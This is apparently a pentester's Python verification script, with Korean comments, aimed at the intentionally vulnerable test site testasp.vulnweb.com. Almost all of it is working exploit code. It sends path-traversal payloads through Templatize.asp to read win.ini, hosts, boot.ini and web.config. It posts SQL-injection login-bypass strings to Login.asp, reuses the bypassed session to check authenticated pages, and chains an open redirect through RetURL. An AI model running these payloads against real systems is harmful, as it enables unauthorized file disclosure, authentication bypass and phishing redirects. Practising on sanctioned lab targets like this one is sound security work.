#!/usr/bin/env python3
"""Round 4 검증 — (a) win.ini 유출 원문, (b) html/../web.config 내용, (c) 로그인 우회 302 Location,
(d) 우회 세션으로 인증 상태 확인, (e) RetURL open redirect 체이닝."""
import subprocess, urllib.parse

BASE = "http://testasp.vulnweb.com"
PROXY = ["-x", "http://127.0.0.1:8080",
         "--cacert", "/home/taeuk/.mitmproxy/mitmproxy-ca-cert.pem"]


def curl(url, data=None, cookie=None, save=None, extra=None):
    cmd = ["curl", "-s", "-i", "-m", "25"] + PROXY
    if cookie:
        cmd += ["-b", cookie, "-c", cookie]
    if data:
        cmd += ["-X", "POST", "--data", data]
    if extra:
        cmd += extra
    cmd += [url]
    p = subprocess.run(cmd, capture_output=True, text=True, errors="replace")
    raw = p.stdout
    head, _, body = raw.partition("\r\n\r\n")
    if save:
        open(save, "w", encoding="latin-1").write(body)
    return head, body


print("=" * 90)
print("### (a) traversal 원문 확인 — windows/win.ini")
h, b = curl(f"{BASE}/Templatize.asp?item=" + urllib.parse.quote("../../../../../../../../windows/win.ini", safe=""),
            save="/tmp/exploit/win_ini.html")
print("응답 헤더 첫줄:", h.split("\n")[0].strip())
print("본문에서 win.ini 고유 문자열 검색:")
for needle in ["for 16-bit app support", "[fonts]", "[extensions]", "[mci extensions]", "[files]",
               "MAPI=1", "CMCD=1"]:
    print(f"   {'✅' if needle in b else '  '} {needle!r}")
i = b.lower().find("for 16-bit app support")
print("--- 발췌 (색인 주변) ---")
print(b[max(0, i - 200): i + 700] if i >= 0 else b[:800])

print()
print("### (a2) 다른 상위 경로 파일도 되는지(존재 확인용)")
for pay in ["../../../../../../../../windows/win.ini",
            "../../../../../../../../windows/system32/drivers/etc/hosts",
            "../../../../../../../../boot.ini",
            "../../../../../../../../windows/win.ini.",
            "..%5c..%5c..%5c..%5cwindows/win.ini"]:
    hh, bb = curl(f"{BASE}/Templatize.asp?item=" + urllib.parse.quote(pay, safe=""))
    print(f"  {pay:60s} -> {hh.split(chr(10))[0].strip()[:30]} len={len(bb)}")

print()
print("### (b) html/../web.config 가 정말 설정파일인가")
h, b = curl(f"{BASE}/Templatize.asp?item=html/../web.config", save="/tmp/exploit/html_dotdot_webconfig.html")
print("첫줄:", h.split("\n")[0].strip(), "len:", len(b))
print(b[:900])

print()
print("### (c) 로그인 우회 302 의 Location 헤더")
ck = "/tmp/exploit/bypass.cookies"
for d in ["tfUName=admin'--&tfUPass=x",
          "tfUName=admin&tfUPass=' OR '1'='1",
          "tfUName=' OR '1'='1'--&tfUPass=x"]:
    h, b = curl(f"{BASE}/Login.asp", data=d, cookie=ck)
    loc = [l.strip() for l in h.split("\n") if l.lower().startswith("location:")]
    setc = [l.strip() for l in h.split("\n") if l.lower().startswith("set-cookie:")]
    print(f"  {d:36s} -> {h.split(chr(10))[0].strip()}")
    print(f"      Location: {loc}   SetCookie: {[c[:40] for c in setc]}")

print()
print("### (d) 우회한 세션으로 인증 상태 확인")
ck = "/tmp/exploit/bypass.cookies"
h, b = curl(f"{BASE}/Login.asp", data="tfUName=x' OR 'x'='x&tfUPass=x", cookie=ck, save="/tmp/exploit/after_bypass.html")
print("  로그인 후 Login.asp 첫줄:", h.split("\n")[0].strip())
for needle in ["Logout", "logout", "admin", "Welcome", "welcome"]:
    if needle in b:
        i = b.find(needle)
        print(f"   ✅ '{needle}' 발견: ...{b[max(0,i-90):i+90].strip()[:200]}...")
        break
h2, b2 = curl(f"{BASE}/Default.asp", cookie=ck, save="/tmp/exploit/authed_default.html")
print("  인증 쿠키로 /Default.asp 첫줄:", h2.split("\n")[0].strip())
print("  메뉴 영역 발췌:", [x for x in b2.split("\n") if "Login.asp" in x or "Logout" in x][:2])
h3, b3 = curl(f"{BASE}/showthread.asp?id=0", cookie=ck, save="/tmp/exploit/authed_thread.html")
print("  인증 쿠키로 /showthread.asp?id=0 → 폼 존재?", "<form" in b3, "| textarea:", "textarea" in b3.lower())
for line in b3.split("\n"):
    if "<form" in line or "textarea" in line.lower() or "Reply" in line or "Post" in line:
        print("     ", line.strip()[:160])

print()
print("### (e) RetURL open redirect — 우회 로그인 + RetURL 조합")
for r_ in ["http://example.com", "http://testasp.vulnweb.com/Default.asp"]:
    h, b = curl(f"{BASE}/Login.asp?RetURL=" + urllib.parse.quote(r_, safe=""),
                data="tfUName=x' OR 'x'='x&tfUPass=x", cookie="/tmp/exploit/bypass2.cookies")
    loc = [l.strip() for l in h.split("\n") if l.lower().startswith("location:")]
    print(f"  RetURL={r_:42s} -> {h.split(chr(10))[0].strip()}  {loc}")
